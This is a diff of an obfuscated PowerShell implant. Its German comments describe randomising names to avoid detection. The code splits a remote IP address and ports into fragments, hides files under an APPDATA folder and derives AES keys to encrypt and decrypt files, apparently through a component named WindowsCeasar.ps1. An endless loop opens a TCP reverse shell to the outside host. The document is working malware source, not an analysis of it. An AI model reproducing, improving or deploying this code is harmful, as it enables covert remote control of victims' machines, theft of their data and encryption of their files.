@@ -339,24 +339,22 @@ $transmitterScriptContent = @'
 # Funktionsnamen geändert zu randomisierten (z.B. FnGk1, FnTd2, FnRe3).
 # Variablennamen randomisiert (z.B. vDh für DOWNLOAD_HOST, vCk für CurrentKey etc.).
 # Änderungen: Initialer Enum entfernt; Recon in dedizierte Befehle geklustert; Help aktualisiert; Prompt dynamisch nach jedem Befehl.
-
+# Fix: Pfad zu WindowsCeasar.ps1 korrigiert auf %USERPROFILE%\operations\System\WindowsCeasar.ps1
 $a = '145'; $b = '223'; $c = '117'; $d = '77'; $obfIp = $a + '.' + $b + '.' + $c + '.' + $d
 $pDl = [int]('4'+'4'+'4'+'4')
 $pUl = [int]('4'+'4'+'4'+'5')
 $pMn = [int]('4'+'4'+'3')
 $hdP1 = 'Micro'; $hdP2 = 'soft'; $hdP3 = '\Win'; $hdP4 = 'dows\Power'; $hdP5 = 'Shell\oper'; $hdP6 = 'ation'
 $vHd = Join-Path -Path $env:APPDATA -ChildPath ($hdP1 + $hdP2 + $hdP3 + $hdP4 + $hdP5 + $hdP6)
-$esP1 = '\Docu'; $esP2 = 'ments\Win'; $esP3 = 'dowsCea'; $esP4 = 'sar.ps1'
+$esP1 = '\ope'; $esP2 = 'rations\Sy'; $esP3 = 'stem\Wind'; $esP4 = 'owsCeasar.ps1'
 $vEs = "$env:USERPROFILE" + $esP1 + $esP2 + $esP3 + $esP4
 $vCk = 't' + 'e' + 's' + 't'
-
 function FnGk1 {
     param ([string]$p1, [byte[]]$s1)
     $kd = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($p1, $s1, 100000)
     $k = $kd.GetBytes(32)
     return $k
 }
-
 function FnTd2 {
     param ([string]$fp, [string]$p1 = $vCk)
     try {
@@ -386,7 +384,6 @@ function FnTd2 {
         throw "Entschlüsselungsfehler: $_"
     }
 }
-
 function FnRe3 {
     param ([string]$tp, [string]$oep, [string]$p1 = $vCk)
     try {
@@ -414,12 +411,10 @@ function FnRe3 {
         throw "Verschlüsselungsfehler: $_"
     }
 }
-
 $vDh = $obfIp
 $vDp = $pDl
 $vUh = $obfIp
 $vUp = $pUl
-
 while ($true) {
     try {
         $vCl = New-Object System.Net.Sockets.TCPClient($obfIp, $pMn)
@@ -428,7 +423,7 @@ while ($true) {
         $vRd = New-Object System.IO.StreamReader($vSt)
         $vWr.AutoFlush = $true
         $vWr.WriteLine("--- Shell verbunden ---")
-        $vPm = "PS " + (Get-Location).Path + "> "  # Initialer Prompt
+        $vPm = "PS " + (Get-Location).Path + "> " # Initialer Prompt
         $vWr.Write($vPm)
         while ($vCl.Connected) {
             $vCm = $vRd.ReadLine()
